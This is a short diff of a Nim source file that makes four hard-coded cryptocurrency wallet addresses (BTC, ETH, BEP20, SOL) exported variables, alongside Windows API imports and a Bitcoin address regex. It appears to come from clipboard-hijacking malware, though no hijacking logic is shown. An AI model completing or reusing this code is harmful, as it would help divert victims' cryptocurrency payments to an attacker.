@@ -1,10 +1,10 @@
 import os, re, strutils, times, osproc, winim
 
-const
-  btcAddress = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
-  ethAddress = "0x1234567890abcdef1234567890abcdef12345678"
-  bep20Address = "0xabcdef1234567890abcdef1234567890abcdef12"
-  solAddress = "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R"
+var
+  btcAddress* = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
+  ethAddress* = "0x1234567890abcdef1234567890abcdef12345678"
+  bep20Address* = "0xabcdef1234567890abcdef1234567890abcdef12"
+  solAddress* = "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R"
 
 let
   btcRegex = re"^[13bc1][a-km-zA-HJ-NP-Z1-9]{25,34}$"
